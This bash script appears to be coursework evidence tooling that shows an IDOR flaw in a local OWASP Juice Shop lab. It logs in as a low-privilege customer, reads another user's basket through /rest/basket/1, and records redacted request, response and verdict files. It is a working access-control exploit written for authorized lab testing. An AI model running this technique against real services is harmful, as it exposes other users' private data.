#!/usr/bin/env bash
# ============================================================================
# CS-02 Controlled Validation #2 - Broken Access Control (IDOR)
# ============================================================================
# Authorized use ONLY against the local OWASP Juice Shop lab (127.0.0.1:3000).
#
# WHAT:  Demonstrates horizontal privilege escalation / IDOR on
#        GET /rest/basket/{id}: a low-privilege 'customer' account reads
#        another user's basket without any ownership check.
# WHY:   PDF Phase 6 requires >=2 controlled technical validations with
#        documented target/objective/method/evidence/result/impact.
# WHERE: Run from the cybersecurity-cs02/ project root on the lab host.
# EXPECTED: victim basket returns HTTP 200 with another user's data.
# ERROR:  Non-empty output showing a 403/404 (would mean not reproducible).
# RECOVERY: Re-run; overwrites evidence files deterministically.
#
# Usage: bash scripts/evidence/validate_idor.sh
# ============================================================================

set -u
BASE="http://127.0.0.1:3000"
EV="evidence"
DATE="$(date -Iseconds)"
TEST_EMAIL="cs02.test.user@lab.local"
TEST_PASS="LabTest123!"

mkdir -p "$EV/requests" "$EV/responses" "$EV/findings"

redact() {
  sed -E \
    -e 's/eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]{5,}/[REDACTED-JWT]/g' \
    -e 's/("[Pp]assword"[[:space:]]*:[[:space:]]*")[^"]*"/\1[REDACTED]"/g'
}

echo "[idor] ensure test customer exists"
curl -s -X POST "$BASE/api/Users" -H "Content-Type: application/json" \
  -d "{\"email\":\"$TEST_EMAIL\",\"password\":\"$TEST_PASS\",\"passwordRepeat\":\"$TEST_PASS\"}" \
  >/dev/null 2>&1

echo "[idor] login as low-privilege customer"
TOKEN=$(curl -s -X POST "$BASE/rest/user/login" -H "Content-Type: application/json" \
  -d "{\"email\":\"$TEST_EMAIL\",\"password\":\"$TEST_PASS\"}" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('authentication',{}).get('token',''))" 2>/dev/null)

if [ -z "$TOKEN" ]; then
  echo "[idor] ERROR: could not obtain test token"; exit 1
fi

# Decode attacker identity from the JWT payload (no extra endpoint needed).
read -r MYID MYROLE < <(echo "$TOKEN" | cut -d. -f2 | python3 -c "
import sys, base64, json
p = sys.stdin.read().strip()
p += '=' * (-len(p) % 4)
d = json.loads(base64.urlsafe_b64decode(p))['data']
print(d.get('id', '?'), d.get('role', '?'))" 2>/dev/null || echo "? ?")
MYROLE="${MYROLE:-?}"

echo "[idor] request victim basket id=1 (owned by UserId 1)"
VICTIM_CODE=$(curl -s -o "$EV/responses/WEB-VUL-002-victim-basket.json.raw" -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" "$BASE/rest/basket/1")
redact < "$EV/responses/WEB-VUL-002-victim-basket.json.raw" > "$EV/responses/WEB-VUL-002-victim-basket.json"
rm -f "$EV/responses/WEB-VUL-002-victim-basket.json.raw"

OWNER=$(python3 -c "import json;d=json.load(open('$EV/responses/WEB-VUL-002-victim-basket.json'))['data'];print(d['UserId'])" 2>/dev/null || echo "?")
ITEMS=$(python3 -c "import json;d=json.load(open('$EV/responses/WEB-VUL-002-victim-basket.json'))['data'];print(len(d.get('Products',[])))" 2>/dev/null || echo "?")

cat > "$EV/requests/WEB-VUL-002-request.txt" <<EOF
# Evidence ID: EVD-V2-REQ
# Finding: WEB-VUL-002 (Broken Access Control - IDOR on basket)
# Date: $DATE
# Target: GET $BASE/rest/basket/1
# Auth: Bearer token of low-privilege customer (id=$MYID, role=customer)
GET /rest/basket/1 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer [REDACTED-JWT]
EOF

{
  echo "# Evidence ID: EVD-V2-RES"
  echo "# Finding: WEB-VUL-002"
  echo "# Date: $DATE"
  echo "# Attacker: customer account id=$MYID role=$MYROLE (no admin privileges)"
  echo "# Victim:   basket id=1, owner UserId=$OWNER"
  echo "# HTTP: $VICTIM_CODE   items returned: $ITEMS"
  echo "# Verdict:"
  if [ "$VICTIM_CODE" = "200" ] && [ "$OWNER" != "$MYID" ] && [ "$OWNER" != "?" ]; then
    echo "   VULNERABLE - horizontal privilege escalation confirmed"
    echo "   Attacker (UserId $MYID) read basket owned by UserId $OWNER ($ITEMS items)."
  else
    echo "   NOT REPRODUCED (code=$VICTIM_CODE owner=$OWNER attacker=$MYID)"
  fi
  echo "# Response body (tokens redacted):"
  cat "$EV/responses/WEB-VUL-002-victim-basket.json"
} > "$EV/findings/WEB-VUL-002-validation.txt"

echo "[idor] result: HTTP $VICTIM_CODE | owner=$OWNER | attacker=$MYID | items=$ITEMS"
echo "[idor] evidence -> $EV/findings/WEB-VUL-002-validation.txt"
